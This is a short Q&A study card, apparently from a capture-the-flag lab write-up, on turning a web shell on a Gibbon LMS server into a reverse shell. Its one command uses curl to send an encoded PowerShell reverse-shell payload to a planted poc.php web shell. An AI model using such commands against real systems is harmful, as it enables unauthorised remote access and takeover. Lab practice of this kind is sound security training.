@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you establish a reverse shell using the web shell?
+
+CONTEXT:
+You want to transfer a reverse shell payload to the server.
+
+METHOD / ANSWER:
+Command: `curl 'http://frizzdc.frizz.htb/Gibbon-LMS/poc.php?cmd=powershell -e <base64_encoded_reverse_shell_command>'`
+Explanation: This command executes a reverse shell command via the web shell.
